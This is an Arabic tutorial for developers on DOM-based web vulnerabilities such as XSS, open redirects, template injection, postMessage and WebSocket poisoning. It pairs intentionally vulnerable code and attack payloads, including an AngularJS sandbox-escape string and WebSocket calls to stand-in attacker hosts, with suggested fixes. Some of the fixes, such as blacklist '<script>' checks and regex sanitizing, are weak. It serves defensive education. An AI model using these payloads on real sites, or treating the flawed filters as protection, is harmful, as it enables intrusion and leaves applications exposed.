# ثغرات DOM-based: دليل شامل للمطورين المحترفين 🔧

*نُشر في: [التاريخ] | بواسطة: [اسم الكاتب] | تصنيف: أمن الويب*

---

## مقدمة 📖

في عالم تطوير الويب الحديث، أصبحت ثغرات DOM-based واحدة من أخطر التهديدات الأمنية التي يواجهها المطورون. هذه الثغرات لا تحدث على الخادم، بل في متصفح المستخدم نفسه، مما يجعل اكتشافها ومنعها أكثر تعقيداً.

في هذا الدليل الشامل، سنتعمق في فهم هذه الثغرات، وكيفية حدوثها، وأفضل الطرق لحماية تطبيقاتنا منها.

---

## ما هو DOM؟ 🏗️

**DOM (Document Object Model)** هو تمثيل برمجي لصفحة HTML في شكل شجرة من العقد (nodes). كل عنصر HTML يصبح كائن JavaScript يمكن التلاعب به برمجياً.

### هيكل DOM الأساسي:
```javascript
// مثال على هيكل DOM
document
├── html
│   ├── head
│   │   ├── title
│   │   ├── meta
│   │   └── link
│   └── body
│       ├── header
│       ├── main
│       │   ├── div#content
│       │   │   ├── h1
│       │   │   ├── p
│       │   │   └── form
│       │   └── aside
│       └── footer
```

### لماذا تحدث الثغرات؟ 🔍

الثغرات تحدث عندما **نثق ببيانات المستخدم** ونستخدمها في سياقات حساسة دون تطهير مناسب. المشكلة الأساسية تكمن في **عدم التحقق من صحة المدخلات** و**استخدام APIs خطيرة**.

---

## 1. DOM-based XSS: العدو الخفي 🎯

### ما هي DOM-based XSS؟

DOM-based XSS هي ثغرة تحدث عندما يتم تنفيذ كود JavaScript خبيث من خلال التلاعب بعناصر DOM في متصفح المستخدم، دون الحاجة لإرسال البيانات للخادم.

### الدوال المسببة للثغرة:

#### `innerHTML` - الأخطر على الإطلاق! ⚠️

```javascript
// ❌ كود ضعيف - ثغرة حقيقية
function displayUserMessage(userInput) {
    const outputElement = document.getElementById('message-output');
    outputElement.innerHTML = userInput; // خطير جداً!
}

// المهاجم يكتب: "<script>alert('XSS')</script>"
// النتيجة: تنفيذ الكود الخبيث فوراً!
```

**لماذا `innerHTML` خطير؟**
- ينفذ HTML و JavaScript مباشرة
- لا يطهر المدخلات تلقائياً
- يمكن حقن أي كود خبيث

#### `document.write()` - القنبلة الموقوتة 💣

```javascript
// ❌ كود ضعيف
function writeUserContent(userInput) {
    document.write("مرحباً " + userInput);
}

// المهاجم يكتب: "<script>alert('XSS')</script>"
// النتيجة: تنفيذ فوري للكود الخبيث!
```

**مخاطر `document.write()`:**
- يكتب مباشرة في DOM
- يمكن أن يمحو الصفحة بالكامل
- تنفيذ فوري للكود

#### `eval()` - تجنبها تماماً! 🚫

```javascript
// ❌ كود ضعيف - خطير جداً
function executeUserCode(userInput) {
    eval(userInput); // كارثة أمنية!
}

// المهاجم يكتب: "alert('XSS'); fetch('/api/steal-data')"
// النتيجة: تنفيذ أي كود خبيث!
```

### أمثلة واقعية للهجمات:

#### مثال 1: حقن عبر URL Parameters
```javascript
// الموقع: https://example.com?message=<script>alert('XSS')</script>
const urlParams = new URLSearchParams(window.location.search);
const userMessage = urlParams.get('message');
document.getElementById('output').innerHTML = userMessage;
```

#### مثال 2: حقن عبر localStorage
```javascript
// المهاجم يضع في localStorage:
localStorage.setItem('userData', '<script>alert("Hacked!")</script>');

// الكود الضعيف:
const userData = localStorage.getItem('userData');
document.getElementById('content').innerHTML = userData;
```

#### مثال 3: حقن عبر location.hash
```javascript
// المهاجم يكتب في URL: #<script>alert('XSS')</script>
const hashData = location.hash.slice(1);
document.write(hashData);
```

### الحلول الآمنة:

#### 1. استخدام `textContent` بدلاً من `innerHTML`
```javascript
// ✅ كود آمن
function displayUserMessage(userInput) {
    const outputElement = document.getElementById('message-output');
    outputElement.textContent = userInput; // آمن - يعرض النص فقط
}

// النتيجة: النص يظهر كما هو، لا تنفيذ للكود
```

#### 2. استخدام `createElement()` و `appendChild()`
```javascript
// ✅ كود آمن
function createUserElement(userInput) {
    const container = document.getElementById('container');
    const element = document.createElement('div');
    element.textContent = userInput;
    container.appendChild(element);
}
```

#### 3. استخدام مكتبات التطهير
```javascript
// ✅ استخدام DOMPurify
import DOMPurify from 'dompurify';

function displaySafeHTML(userInput) {
    const cleanHTML = DOMPurify.sanitize(userInput);
    document.getElementById('output').innerHTML = cleanHTML;
}
```

---

## 2. DOM-based Open Redirect: التوجيه الخبيث 🔄

### ما هي Open Redirect؟

ثغرة تسمح للمهاجم بتوجيه المستخدم إلى موقع ضار من خلال التلاعب بمعاملات URL أو بيانات أخرى في DOM.

### الدوال المسببة للثغرة:

#### `window.location.href`
```javascript
// ❌ كود ضعيف
function redirectUser() {
    const redirectUrl = new URLSearchParams(window.location.search).get('redirect');
    window.location.href = redirectUrl; // خطير!
}

// المهاجم يكتب: "?redirect=https://evil-phishing.com"
// النتيجة: توجيه لموقع التصيد!
```

#### `window.location.replace()`
```javascript
// ❌ كود ضعيف
function navigateToPage() {
    const nextPage = location.hash.slice(1);
    window.location.replace(nextPage); // خطير!
}

// المهاجم يكتب: "#https://malicious-site.com"
// النتيجة: توجيه خبيث!
```

### سيناريوهات الهجوم الواقعية:

#### سيناريو 1: التصيد الاحتيالي
```javascript
// المهاجم يرسل رابط: https://bank.com?redirect=https://fake-bank.com
// المستخدم يظن أنه في البنك الحقيقي
// النتيجة: تسريب بيانات البطاقة!
```

#### سيناريو 2: سرقة الجلسة
```javascript
// المهاجم يوجه المستخدم لموقع يسرق الكوكيز
// النتيجة: الوصول لحساب المستخدم!
```

### الحلول الآمنة:

#### 1. التحقق من صحة URL
```javascript
// ✅ كود آمن
function isValidRedirect(url) {
    const allowedDomains = ['example.com', 'trusted-partner.com'];
    
    try {
        const urlObj = new URL(url);
        return allowedDomains.includes(urlObj.hostname);
    } catch {
        return false;
    }
}

function safeRedirect() {
    const redirectUrl = new URLSearchParams(window.location.search).get('redirect');
    
    if (isValidRedirect(redirectUrl)) {
        window.location.href = redirectUrl;
    } else {
        window.location.href = '/default-page';
    }
}
```

#### 2. استخدام whitelist صارم
```javascript
// ✅ كود آمن
const ALLOWED_REDIRECTS = {
    'login': '/dashboard',
    'logout': '/home',
    'profile': '/account'
};

function safeNavigate(action) {
    const targetUrl = ALLOWED_REDIRECTS[action];
    if (targetUrl) {
        window.location.href = targetUrl;
    }
}
```

---

## 3. Client-Side Template Injection: حقن القوالب 📝

### ما هي Template Injection؟

ثغرة تحدث عندما يتم حقن كود خبيث في محركات القوالب على جانب العميل مثل AngularJS أو Handlebars.

### الدوال المسببة للثغرة:

#### AngularJS - `$compile()`
```javascript
// ❌ كود ضعيف (AngularJS)
function compileUserTemplate(userInput) {
    var template = '<div>' + userInput + '</div>';
    $compile(template)($scope); // خطير!
}

// المهاجم يكتب: "{{constructor.constructor('alert(1)')()}}"
// النتيجة: تنفيذ كود JavaScript!
```

#### Handlebars - `Handlebars.compile()`
```javascript
// ❌ كود ضعيف
function renderUserTemplate(userInput) {
    const template = Handlebars.compile(userInput);
    const result = template(data);
    document.getElementById('output').innerHTML = result;
}

// المهاجم يكتب: "{{#with this}}{{constructor}}{{/with}}"
// النتيجة: تسريب معلومات حساسة!
```

### أمثلة الهجمات المتقدمة:

#### هجوم AngularJS Expression
```javascript
// المهاجم يكتب: "{{7*7}}" 
// النتيجة: "49" - تأكيد وجود AngularJS

// المهاجم يكتب: "{{constructor.constructor('alert(1)')()}}"
// النتيجة: تنفيذ alert!
```

#### هجوم Handlebars Prototype Pollution
```javascript
// المهاجم يكتب: "{{#with this}}{{constructor}}{{/with}}"
// النتيجة: تسريب معلومات عن الكائنات
```

### الحلول الآمنة:

#### 1. استخدام template literals آمنة
```javascript
// ✅ كود آمن
function renderSafeTemplate(userInput) {
    const template = `<div>${escapeHtml(userInput)}</div>`;
    document.getElementById('output').innerHTML = template;
}

function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}
```

#### 2. تطهير المدخلات
```javascript
// ✅ كود آمن
import DOMPurify from 'dompurify';

function renderSanitizedTemplate(userInput) {
    const sanitizedInput = DOMPurify.sanitize(userInput);
    const template = `<div>${sanitizedInput}</div>`;
    document.getElementById('output').innerHTML = template;
}
```

---

## 4. DOM Clobbering: استبدال العناصر 💥

### ما هي DOM Clobbering؟

ثغرة تحدث عندما يتم استبدال الدوال أو المتغيرات بعناصر HTML من خلال التلاعب بـ `id` أو `name` attributes.

### الآلية المسببة للثغرة:

#### الوصول المباشر للعناصر عبر `id`
```javascript
// ❌ كود ضعيف
function saveUserData() {
    if (window.saveData) {
        window.saveData(); // دالة افتراضية
    }
}

// المهاجم يضع: <form id="saveData"><input name="alert"></form>
// النتيجة: window.saveData أصبح عنصر HTML!
```

#### الوصول عبر `name` attribute
```javascript
// ❌ كود ضعيف
function processForm() {
    if (document.forms.saveForm) {
        // معالجة النموذج
        console.log('Processing form...');
    }
}

// المهاجم يضع: <input name="saveForm" value="malicious">
// النتيجة: استبدال النموذج!
```

### سيناريوهات الهجوم:

#### سيناريو 1: استبدال الدوال
```javascript
// الكود الأصلي يتوقع دالة
if (typeof window.validateUser === 'function') {
    window.validateUser();
}

// المهاجم يضع عنصر بنفس الاسم
// <div id="validateUser">malicious content</div>
```

#### سيناريو 2: استبدال النماذج
```javascript
// الكود يبحث عن نموذج
const form = document.forms.userForm;
if (form) {
    form.submit();
}

// المهاجم يضع عنصر بنفس الاسم
// <input name="userForm" value="hacked">
```

### الحلول الآمنة:

#### 1. التحقق من نوع الكائن
```javascript
// ✅ كود آمن
function safeSaveData() {
    if (typeof window.saveData === 'function') {
        window.saveData();
    } else {
        console.error('saveData function not found');
    }
}
```

#### 2. استخدام getElementById
```javascript
// ✅ كود آمن
function safeProcessForm() {
    const formElement = document.getElementById('saveForm');
    
    if (formElement && formElement.tagName === 'FORM') {
        // معالجة النموذج
        console.log('Processing form...');
    } else {
        console.error('Form not found');
    }
}
```

#### 3. تجنب الوصول المباشر
```javascript
// ✅ كود آمن
function safeFunctionCall() {
    const targetFunction = window.saveData;
    
    if (targetFunction && typeof targetFunction === 'function') {
        targetFunction();
    } else {
        console.error('Function not available');
    }
}
```

---

## 5. LocalStorage/SessionStorage Poisoning: تسميم التخزين 💾

### ما هي Storage Poisoning؟

ثغرة تحدث عندما يتم تخزين بيانات خبيثة في localStorage أو sessionStorage، ثم تنفيذها لاحقاً.

### الدوال المسببة للثغرة:

#### `localStorage.setItem()` + `eval()`
```javascript
// ❌ كود ضعيف
function storeUserData(userInput) {
    localStorage.setItem('userData', userInput);
}

function loadUserData() {
    const data = localStorage.getItem('userData');
    eval(data); // كارثة أمنية!
}

// المهاجم يكتب: "alert('Poisoned!'); fetch('/api/steal')"
// النتيجة: تنفيذ كود خبيث!
```

#### `sessionStorage` + `innerHTML`
```javascript
// ❌ كود ضعيف
function storeUserPrefs(userInput) {
    sessionStorage.setItem('userPrefs', userInput);
}

function displayUserPrefs() {
    const prefs = sessionStorage.getItem('userPrefs');
    document.getElementById('prefs').innerHTML = prefs;
}

// المهاجم يكتب: "<script>alert('XSS')</script>"
// النتيجة: تنفيذ XSS!
```

### سيناريوهات الهجوم:

#### سيناريو 1: تخزين كود خبيث
```javascript
// المهاجم يضع في localStorage:
localStorage.setItem('userScript', 'alert("Hacked!"); stealCookies();');

// الكود الضعيف ينفذ الكود المخزن
eval(localStorage.getItem('userScript'));
```

#### سيناريو 2: تخزين HTML خبيث
```javascript
// المهاجم يضع HTML خبيث
sessionStorage.setItem('userContent', '<img src=x onerror="alert(\'XSS\')">');

// الكود الضعيف يعرض HTML
document.getElementById('content').innerHTML = sessionStorage.getItem('userContent');
```

### الحلول الآمنة:

#### 1. التحقق من نوع البيانات
```javascript
// ✅ كود آمن
function safeStore(key, value) {
    if (typeof value === 'string' && !value.includes('<script>')) {
        localStorage.setItem(key, value);
    } else {
        console.error('Invalid data type or malicious content detected');
    }
}
```

#### 2. استخدام JSON.parse بدلاً من eval
```javascript
// ✅ كود آمن
function safeLoadData() {
    try {
        const data = JSON.parse(localStorage.getItem('userData'));
        // معالجة البيانات بأمان
        processUserData(data);
    } catch (e) {
        console.error('Invalid JSON data');
    }
}
```

#### 3. تطهير البيانات قبل التخزين
```javascript
// ✅ كود آمن
import DOMPurify from 'dompurify';

function safeStoreHTML(key, htmlContent) {
    const cleanHTML = DOMPurify.sanitize(htmlContent);
    localStorage.setItem(key, cleanHTML);
}

function safeDisplayHTML(key) {
    const cleanHTML = localStorage.getItem(key);
    document.getElementById('output').innerHTML = cleanHTML;
}
```

---

## 6. postMessage Manipulation: التلاعب بالرسائل 📨

### ما هي postMessage Manipulation؟

ثغرة تحدث عندما يتم استقبال رسائل خبيثة عبر `window.postMessage()` دون التحقق من مصدرها.

### الدوال المسببة للثغرة:

#### `addEventListener('message')` بدون تحقق
```javascript
// ❌ كود ضعيف
window.addEventListener('message', function(event) {
    // تنفيذ الرسالة مباشرة
    eval(event.data); // خطير جداً!
});

// المهاجم يرسل: postMessage('alert("Hacked!")', '*')
// النتيجة: تنفيذ كود خبيث!
```

#### `window.postMessage()` مع origin ضعيف
```javascript
// ❌ كود ضعيف
function sendMessage(data) {
    window.postMessage(data, '*'); // خطير!
}

// المشكلة: '*' يسمح لأي origin
// المهاجم يستقبل الرسالة من أي موقع
```

### سيناريوهات الهجوم:

#### سيناريو 1: سرقة البيانات
```javascript
// المهاجم يرسل رسالة لسرقة البيانات
window.postMessage({
    type: 'getUserData',
    action: 'steal'
}, '*');

// الكود الضعيف يستجيب
window.addEventListener('message', function(event) {
    if (event.data.type === 'getUserData') {
        // إرسال البيانات الحساسة!
        event.source.postMessage({
            userData: getUserData()
        }, '*');
    }
});
```

#### سيناريو 2: تنفيذ كود خبيث
```javascript
// المهاجم يرسل كود خبيث
window.postMessage('alert("Hacked!"); fetch("/api/steal")', '*');

// الكود الضعيف ينفذ الكود
window.addEventListener('message', function(event) {
    eval(event.data);
});
```

### الحلول الآمنة:

#### 1. التحقق من origin
```javascript
// ✅ كود آمن
window.addEventListener('message', function(event) {
    const allowedOrigins = [
        'https://trusted-partner.com',
        'https://secure-api.com'
    ];
    
    if (!allowedOrigins.includes(event.origin)) {
        console.warn('Message from untrusted origin:', event.origin);
        return; // تجاهل الرسائل من مصادر غير موثوقة
    }
    
    // معالجة الرسالة بأمان
    handleMessage(event.data);
});
```

#### 2. تحديد origin محدد
```javascript
// ✅ كود آمن
function sendSecureMessage(data) {
    window.postMessage(data, 'https://trusted-partner.com');
}
```

#### 3. التحقق من نوع البيانات
```javascript
// ✅ كود آمن
function handleMessage(data) {
    // التحقق من نوع البيانات
    if (typeof data === 'object' && data.type === 'userAction') {
        // معالجة آمنة للبيانات
        processUserAction(data.action);
    } else {
        console.warn('Invalid message format');
    }
}
```

---

## 7. WebSocket URL Poisoning: تسميم روابط WebSocket 🔌

### ما هي WebSocket URL Poisoning؟

ثغرة تحدث عندما يتم التلاعب برابط WebSocket ليتصل بخادم ضار بدلاً من الخادم الآمن.

### الدوال المسببة للثغرة:

#### `new WebSocket()` مع URL غير محدد
```javascript
// ❌ كود ضعيف
function connectToWebSocket() {
    const wsUrl = location.search.split('ws=')[1];
    const ws = new WebSocket(wsUrl); // خطير!
}

// المهاجم يكتب: "?ws=ws://evil.com/steal"
// النتيجة: اتصال بخادم ضار!
```

#### `WebSocket` مع user input
```javascript
// ❌ كود ضعيف
function createWebSocket(serverUrl) {
    const ws = new WebSocket(serverUrl); // المستخدم يحدد الخادم!
}

// المهاجم يكتب: "ws://attacker.com"
// النتيجة: تسريب البيانات!
```

### سيناريوهات الهجوم:

#### سيناريو 1: سرقة البيانات
```javascript
// المهاجم يوجه الاتصال لخادمه
const maliciousUrl = 'ws://attacker.com/steal';
const ws = new WebSocket(maliciousUrl);

// الخادم الضار يستقبل البيانات الحساسة
ws.onmessage = function(event) {
    // إرسال البيانات للهجوم
    sendToAttacker(event.data);
};
```

#### سيناريو 2: Man-in-the-Middle
```javascript
// المهاجم ينشئ خادم وسيط
// يوجه الاتصال لخادمه بدلاً من الخادم الحقيقي
const proxyUrl = 'ws://attacker-proxy.com';
const ws = new WebSocket(proxyUrl);
```

### الحلول الآمنة:

#### 1. التحقق من صحة WebSocket URL
```javascript
// ✅ كود آمن
function isValidWebSocketUrl(url) {
    try {
        const urlObj = new URL(url);
        const allowedHosts = [
            'ws.example.com',
            'wss.secure.com',
            'chat.trusted.com'
        ];
        
        return (urlObj.protocol === 'ws:' || urlObj.protocol === 'wss:') &&
               allowedHosts.includes(urlObj.hostname);
    } catch {
        return false;
    }
}

function safeWebSocketConnect() {
    const wsUrl = location.search.split('ws=')[1];
    
    if (isValidWebSocketUrl(wsUrl)) {
        const ws = new WebSocket(wsUrl);
        return ws;
    } else {
        console.error('Invalid WebSocket URL');
        return null;
    }
}
```

#### 2. استخدام URL ثابت
```javascript
// ✅ كود آمن
function createSecureWebSocket() {
    const ws = new WebSocket('wss://secure.example.com/ws');
    
    ws.onopen = function() {
        console.log('Connected to secure WebSocket');
    };
    
    ws.onerror = function(error) {
        console.error('WebSocket error:', error);
    };
    
    return ws;
}
```

#### 3. استخدام whitelist صارم
```javascript
// ✅ كود آمن
const WEBSOCKET_CONFIG = {
    allowedServers: [
        'wss://chat.example.com',
        'wss://notifications.example.com'
    ],
    defaultServer: 'wss://chat.example.com'
};

function connectToAllowedServer(serverType) {
    const serverUrl = WEBSOCKET_CONFIG.allowedServers.find(
        server => server.includes(serverType)
    ) || WEBSOCKET_CONFIG.defaultServer;
    
    return new WebSocket(serverUrl);
}
```

---

## 8. Cookie Manipulation: التلاعب بالكوكيز 🍪

### ما هي Cookie Manipulation؟

ثغرة تحدث عندما يتم التلاعب بقيم الكوكيز لتحقيق صلاحيات غير مصرح بها أو سرقة الجلسات.

### الدوال المسببة للثغرة:

#### `document.cookie` مع user input
```javascript
// ❌ كود ضعيف
function setUserRole() {
    const userRole = location.hash.slice(1);
    document.cookie = `role=${userRole}`; // خطير!
}

// المهاجم يكتب: "#admin"
// النتيجة: يصبح مدير الموقع!
```

#### `document.cookie` بدون تطهير
```javascript
// ❌ كود ضعيف
function setUserPrefs(userPrefs) {
    document.cookie = `prefs=${userPrefs}`; // لا يوجد تطهير!
}

// المهاجم يكتب: "admin; path=/admin; secure"
// النتيجة: تعديل مسار الـ cookie!
```

### سيناريوهات الهجوم:

#### سيناريو 1: رفع الصلاحيات
```javascript
// المهاجم يغير دوره من "user" إلى "admin"
document.cookie = 'role=admin; path=/; secure';

// الكود يتحقق من الدور
if (getCookie('role') === 'admin') {
    showAdminPanel(); // عرض لوحة الإدارة!
}
```

#### سيناريو 2: سرقة الجلسة
```javascript
// المهاجم يسرق session ID
const stolenSession = 'sessionId=hijacked123';
document.cookie = stolenSession;

// الكود يستخدم الجلسة المسروقة
const sessionId = getCookie('sessionId');
authenticateUser(sessionId);
```

### الحلول الآمنة:

#### 1. التحقق من القيم المسموحة
```javascript
// ✅ كود آمن
function setUserRole(role) {
    const allowedRoles = ['user', 'moderator', 'editor'];
    
    if (allowedRoles.includes(role)) {
        document.cookie = `role=${role}; path=/; secure; samesite=strict`;
    } else {
        console.error('Invalid role specified');
    }
}
```

#### 2. استخدام HttpOnly cookies (جانب الخادم)
```javascript
// ✅ على الخادم - آمن
// Set-Cookie: role=user; HttpOnly; Secure; SameSite=Strict

// ✅ على العميل - قراءة فقط
function getUserRole() {
    // لا يمكن الوصول للكوكيز HttpOnly من JavaScript
    // يتم إرسالها تلقائياً مع الطلبات
    return null; // الكوكيز محمية
}
```

#### 3. تطهير القيم
```javascript
// ✅ كود آمن
function setCookie(name, value) {
    const cleanValue = encodeURIComponent(value);
    document.cookie = `${name}=${cleanValue}; path=/; secure; samesite=strict`;
}

function getCookie(name) {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) {
        return decodeURIComponent(parts.pop().split(';').shift());
    }
    return null;
}
```

#### 4. استخدام مكتبات آمنة
```javascript
// ✅ كود آمن
import Cookies from 'js-cookie';

function setSecureCookie(name, value, options = {}) {
    const secureOptions = {
        secure: true,
        sameSite: 'strict',
        ...options
    };
    
    Cookies.set(name, value, secureOptions);
}

function getSecureCookie(name) {
    return Cookies.get(name);
}
```

---

## أفضل الممارسات للحماية 🛡️

### 1. تطهير المدخلات (Input Sanitization)

#### استخدام مكتبات التطهير
```javascript
// ✅ استخدام DOMPurify
import DOMPurify from 'dompurify';

function sanitizeUserInput(userInput) {
    return DOMPurify.sanitize(userInput, {
        ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
        ALLOWED_ATTR: ['href', 'title']
    });
}

// ✅ تطهير مخصص
function customSanitize(input) {
    return input
        .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '')
        .replace(/javascript:/gi, '')
        .replace(/on\w+\s*=/gi, '');
}
```

#### التحقق من نوع البيانات
```javascript
// ✅ التحقق الشامل
function validateInput(userInput) {
    if (typeof userInput !== 'string') {
        throw new Error('Input must be a string');
    }
    
    if (userInput.length > 1000) {
        throw new Error('Input too long');
    }
    
    if (userInput.includes('<script>') || userInput.includes('javascript:')) {
        throw new Error('Malicious content detected');
    }
    
    return userInput;
}
```

### 2. Content Security Policy (CSP)

#### CSP قوي
```html
<!-- ✅ CSP شامل -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; 
               script-src 'self' https://trusted-cdn.com; 
               style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
               font-src 'self' https://fonts.gstatic.com;
               img-src 'self' data: https:;
               connect-src 'self' https://api.example.com;
               object-src 'none'; 
               base-uri 'self';
               form-action 'self';
               frame-ancestors 'none';">
```

#### CSP ديناميكي
```javascript
// ✅ إضافة CSP ديناميكياً
function addCSP() {
    const meta = document.createElement('meta');
    meta.httpEquiv = 'Content-Security-Policy';
    meta.content = "default-src 'self'; script-src 'self'";
    document.head.appendChild(meta);
}
```

### 3. التحقق من Origin

#### التحقق من مصدر البيانات
```javascript
// ✅ التحقق الشامل من Origin
function validateOrigin(origin) {
    const allowedOrigins = [
        'https://example.com',
        'https://www.example.com',
        'https://api.example.com'
    ];
    
    return allowedOrigins.includes(origin);
}

// ✅ التحقق من Referer
function validateReferer() {
    const referer = document.referrer;
    const currentDomain = window.location.hostname;
    
    if (referer && !referer.includes(currentDomain)) {
        console.warn('Suspicious referer detected');
        return false;
    }
    
    return true;
}
```

### 4. استخدام APIs آمنة

#### تجنب الدوال الخطيرة
```javascript
// ❌ تجنب هذه الدوال
element.innerHTML = userInput;
eval(userInput);
document.write(userInput);
new Function(userInput)();
setTimeout(userInput, 1000);
setInterval(userInput, 1000);

// ✅ استخدم هذه البدائل
element.textContent = userInput;
JSON.parse(userInput); // مع try-catch
element.appendChild(createElement(userInput));
setTimeout(() => safeFunction(), 1000);
```

#### استخدام APIs آمنة
```javascript
// ✅ APIs آمنة
function safeDOMManipulation(userInput) {
    // إنشاء عناصر آمنة
    const element = document.createElement('div');
    element.textContent = userInput;
    
    // إضافة للـ DOM
    document.getElementById('container').appendChild(element);
}

function safeDataProcessing(userInput) {
    try {
        const data = JSON.parse(userInput);
        return processData(data);
    } catch (e) {
        console.error('Invalid JSON data');
        return null;
    }
}
```

### 5. مراقبة الأخطاء والسلوك المشبوه

#### تسجيل الأخطاء المشبوهة
```javascript
// ✅ مراقبة الأخطاء
window.addEventListener('error', function(event) {
    const errorMessage = event.error?.message || event.message;
    
    if (errorMessage.includes('eval') || 
        errorMessage.includes('innerHTML') ||
        errorMessage.includes('document.write')) {
        
        console.warn('Suspicious error detected:', errorMessage);
        
        // إرسال تنبيه للمطورين
        reportSuspiciousActivity({
            type: 'suspicious_error',
            message: errorMessage,
            url: window.location.href,
            timestamp: new Date().toISOString()
        });
    }
});
```

#### مراقبة التغييرات في DOM
```javascript
// ✅ مراقبة DOM
const observer = new MutationObserver(function(mutations) {
    mutations.forEach(function(mutation) {
        if (mutation.type === 'childList') {
            const addedNodes = Array.from(mutation.addedNodes);
            
            addedNodes.forEach(function(node) {
                if (node.nodeType === Node.ELEMENT_NODE) {
                    // فحص العناصر المضافة
                    checkForSuspiciousElements(node);
                }
            });
        }
    });
});

function checkForSuspiciousElements(element) {
    // فحص للعناصر المشبوهة
    const suspiciousSelectors = [
        'script[src*="evil.com"]',
        'iframe[src*="malicious"]',
        'img[onerror]',
        'div[onclick]'
    ];
    
    suspiciousSelectors.forEach(function(selector) {
        if (element.matches(selector) || element.querySelector(selector)) {
            console.warn('Suspicious element detected:', selector);
            reportSuspiciousActivity({
                type: 'suspicious_element',
                selector: selector,
                element: element.outerHTML
            });
        }
    });
}

// بدء المراقبة
observer.observe(document.body, {
    childList: true,
    subtree: true
});
```

---

## أدوات الاختبار والاكتشاف 🔍

### 1. Burp Suite

#### تحليل الطلبات والردود
```javascript
// ✅ إعداد Burp Suite للاختبار
// 1. تكوين Proxy
// 2. تفعيل Intercept
// 3. تحليل الطلبات للثغرات
// 4. اختبار نقاط الضعف
```

#### اكتشاف نقاط الضعف
```javascript
// ✅ اختبار تلقائي
// 1. Spider للاكتشاف
// 2. Active Scan للثغرات
// 3. Passive Scan للتحليل
// 4. Custom Payloads للاختبار
```

### 2. Browser DevTools

#### مراقبة التغييرات في DOM
```javascript
// ✅ كود مراقبة DOM
const observer = new MutationObserver(function(mutations) {
    mutations.forEach(function(mutation) {
        if (mutation.type === 'childList') {
            console.log('DOM changed:', {
                addedNodes: mutation.addedNodes.length,
                removedNodes: mutation.removedNodes.length,
                target: mutation.target
            });
        }
    });
});

observer.observe(document.body, {
    childList: true,
    subtree: true,
    attributes: true,
    attributeOldValue: true
});
```

#### تحليل الشبكة
```javascript
// ✅ مراقبة الطلبات
// 1. Network tab في DevTools
// 2. مراقبة XHR requests
// 3. تحليل WebSocket connections
// 4. فحص Cookies
```

### 3. DOM Invader (Burp Extension)

#### اكتشاف تلقائي لثغرات DOM
```javascript
// ✅ إعداد DOM Invader
// 1. تثبيت Extension
// 2. تكوين Sources
// 3. تحديد Sinks
// 4. تشغيل الاختبار التلقائي
```

#### تحليل مصادر البيانات
```javascript
// ✅ تحليل المصادر
// 1. URL parameters
// 2. Cookies
// 3. localStorage
// 4. sessionStorage
// 5. postMessage
// 6. WebSocket messages
```

### 4. Manual Testing

#### اختبار DOM XSS
```javascript
// ✅ اختبارات يدوية
// اختبار DOM XSS
location.hash = '<script>alert(1)</script>';
location.search = '?data=<script>alert(1)</script>';

// اختبار postMessage
window.postMessage('test', '*');
window.postMessage('<script>alert(1)</script>', '*');

// اختبار localStorage
localStorage.setItem('test', '<script>alert(1)</script>');
sessionStorage.setItem('test', 'javascript:alert(1)');

// اختبار WebSocket
const ws = new WebSocket('ws://evil.com');
ws.send('<script>alert(1)</script>');
```

#### اختبار Cookie Manipulation
```javascript
// ✅ اختبار الكوكيز
// تغيير قيمة الكوكيز
document.cookie = 'role=admin';

// إضافة كوكيز جديدة
document.cookie = 'sessionId=hijacked123';

// اختبار HttpOnly
console.log(document.cookie); // لا تظهر HttpOnly cookies
```

---

## الخلاصة والتوصيات 🎯

### المبادئ الأساسية للأمان:

1. **لا تثق أبداً ببيانات المستخدم**
   - تطهر كل المدخلات قبل الاستخدام
   - تحقق من نوع البيانات
   - استخدم whitelist بدلاً من blacklist

2. **استخدم APIs آمنة**
   - تجنب `innerHTML`, `eval`, `document.write`
   - استخدم `textContent`, `createElement`, `JSON.parse`
   - طبق مبدأ "الصلاحيات الدنيا"

3. **تحقق من مصدر البيانات**
   - تحقق من Origin في postMessage
   - تحقق من صحة URLs
   - تحقق من مصداقية الخوادم

4. **راقب الأخطاء والسلوك المشبوه**
   - سجل الأخطاء المشبوهة
   - راقب التغييرات في DOM
   - أرسل تنبيهات للمطورين

5. **طبق دفاعات متعددة الطبقات**
   - CSP قوي
   - تطهير المدخلات
   - التحقق من الصلاحيات
   - مراقبة مستمرة

### الدوال الخطيرة (تجنبها):
- `innerHTML` → استخدم `textContent`
- `eval()` → استخدم `JSON.parse`
- `document.write()` → استخدم `createElement`
- `window.location.href` → تحقق من URL
- `new WebSocket()` → تحقق من الخادم
- `window.postMessage()` → تحقق من Origin

### الدوال الآمنة:
- `textContent` - عرض نص آمن
- `createElement()` - إنشاء عناصر آمنة
- `JSON.parse()` - تحليل JSON آمن
- `DOMPurify.sanitize()` - تطهير HTML
- `encodeURIComponent()` - تشفير URLs
- `getElementById()` - الوصول الآمن للعناصر

### خطوات التنفيذ:

1. **التقييم**
   - فحص الكود الحالي للثغرات
   - تحديد نقاط الضعف
   - تقييم المخاطر

2. **التطبيق**
   - تطبيق الحلول الآمنة
   - اختبار التغييرات
   - توثيق الإجراءات

3. **المراقبة**
   - مراقبة مستمرة
   - تحديث الحماية
   - تحسين الإجراءات

---

## المراجع والموارد 📚

### أدوات الاختبار:
- [Burp Suite](https://portswigger.net/burp)
- [OWASP ZAP](https://owasp.org/www-project-zap/)
- [DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader)
- [Browser DevTools](https://developer.chrome.com/docs/devtools/)

### مكتبات الحماية:
- [DOMPurify](https://github.com/cure53/DOMPurify)
- [js-cookie](https://github.com/js-cookie/js-cookie)
- [CSP Builder](https://github.com/paragonie/csp-builder)

### مصادر التعلم:
- [OWASP DOM-based XSS](https://owasp.org/www-community/attacks/DOM_Based_XSS)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [MDN Web Security](https://developer.mozilla.org/en-US/docs/Web/Security)

---

*هذا الدليل للتعليم والاختبار الأخلاقي فقط. استخدم هذه المعرفة لحماية تطبيقاتك ومساعدة الآخرين في بناء تطبيقات أكثر أماناً.* 🛡️

---

**تابعنا للمزيد من المحتوى التقني والأمني!** 📧

*هل وجدت هذا الدليل مفيداً؟ شاركه مع زملائك المطورين!* 🚀 